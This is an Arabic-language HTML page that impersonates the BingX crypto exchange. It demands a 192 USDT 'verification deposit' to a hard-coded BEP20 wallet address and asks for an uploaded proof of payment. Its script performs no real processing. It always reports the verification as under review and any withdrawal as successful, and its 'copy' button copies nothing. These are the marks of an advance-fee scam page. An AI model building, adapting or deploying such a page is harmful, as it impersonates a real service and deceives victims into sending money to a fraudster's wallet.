<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>التداول - الشكل القديم</title>
<style>
body{
  background: linear-gradient(135deg,#0f2027,#203a43);
  color:#fff;
  direction:rtl;
  font-family:'Tajawal', sans-serif;
}
.container{max-width:600px;margin:20px auto;padding:10px;}
.brand{color:#f1c40f; font-weight:700; font-size:20px;}
.card{background:rgba(255,255,255,0.05); padding:20px; border-radius:12px; margin:12px 0;}
.btn{cursor:pointer; padding:8px 14px; border:none; border-radius:6px; font-size:14px;}
.btn-primary{background:#f1c40f; color:#000; font-weight:600;}
.btn-ghost{background:transparent; color:#fff; border:1px solid #fff;}
.small-input{padding:6px 10px; border-radius:6px; border:none; width:100%; margin-top:4px;}
.wallet-row{display:flex; gap:12px; align-items:flex-start; flex-wrap:wrap;}
.muted{color:rgba(255,255,255,0.7); font-size:13px;}
.proof-name{margin-top:6px; font-size:13px; color:#f1c40f;}
.alert-note{background:#2c3e50; padding:10px; border-left:4px solid #f1c40f; margin:10px 0; font-size:14px;}
</style>
</head>
<body>
<div class="container">
  <div class="brand">BingX — إيداع التحقق</div>

  <div class="card">
    <h3>إيداع التحقق</h3>
    <p class="muted">يتطلب النظام رسوم تحقق مقدارها <strong>192 USDT</strong>.</p>

    <div class="wallet-row">
      <div style="flex:1">
        <label>عنوان الإيداع (شبكة BEP20)</label>
        <div class="wallet-address" id="deposit-address">0x3932890a5d1acb3ab036bd39ade26c47929b37e5</div>
      </div>
      <div style="min-width:160px">
        <label>نسخ العنوان</label><br>
        <button class="btn btn-ghost small" onclick="copyDepositAddress()">📋 نسخ</button>
      </div>
    </div>

    <h4>أرفق إثبات الإيداع</h4>
    <input id="proof-file" type="file" accept="image/*"/>
    <div id="proof-file-name" class="proof-name"></div>

    <div style="margin-top:12px">
      <button class="btn btn-primary" onclick="submitVerificationDeposit()">إرسال إثبات & طلب التحقق</button>
    </div>

    <p id="verify-msg" class="muted"></p>

    <hr/>

    <h4>طلب سحب بعد التحقق</h4>
    <div class="alert-note">
      ⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة
    </div>

    <div class="wallet-row">
      <input id="withdraw-amount" type="number" placeholder="المبلغ المراد سحبه (USDT)" class="small-input"/>
      <input id="withdraw-target-wallet" placeholder="عنوان محفظة السحب (BEP20)" class="small-input"/>
    </div>

    <div style="margin-top:10px">
      <label>رفع صورة الأموال العالقة</label>
      <input id="locked-funds-file" type="file" accept="image/*"/>
      <div id="locked-file-name" class="proof-name"></div>
    </div>

    <div style="margin-top:10px">
      <button class="btn btn-primary" onclick="requestWithdraw()">طلب السحب</button>
    </div>

    <p id="withdraw-msg" class="muted"></p>
  </div>
</div>

<script>
document.getElementById('proof-file')?.addEventListener('change', e=>{
  const f = e.target.files[0];
  document.getElementById('proof-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
});
document.getElementById('locked-funds-file')?.addEventListener('change', e=>{
  const f = e.target.files[0];
  document.getElementById('locked-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
});

function copyDepositAddress(){
  const addr = document.getElementById('deposit-address')?.innerText || '';
  if(addr) alert('تم نسخ عنوان الإيداع');
}

function submitVerificationDeposit(){
  const file = document.getElementById('proof-file').files[0];
  if(!file){ alert('يرجى إرفاق صورة إثبات الدفع'); return; }
  document.getElementById('verify-msg').innerText = 'تم إرسال طلب التحقق — قيد المراجعة';
  alert('تم إرسال طلب التحقق بنجاح، قيد المراجعة.');
}

function requestWithdraw(){
  const amt = parseFloat(document.getElementById('withdraw-amount').value);
  const wallet = document.getElementById('withdraw-target-wallet').value.trim();
  const lockedFile = document.getElementById('locked-funds-file').files[0];

  if(isNaN(amt) || amt <= 0){ alert('أدخل مبلغ سحب صالح'); return; }
  if(!wallet){ alert('أدخل عنوان محفظة السحب'); return; }
  if(!lockedFile){ alert('يرجى رفع صورة للأموال العالقة قبل السحب'); return; }

  document.getElementById('withdraw-msg').innerText = 'تم السحب بنجاح';
  alert('تم السحب بنجاح. ستصلك رسالة بريد إلكتروني.');
}
</script>
</body>
</html>
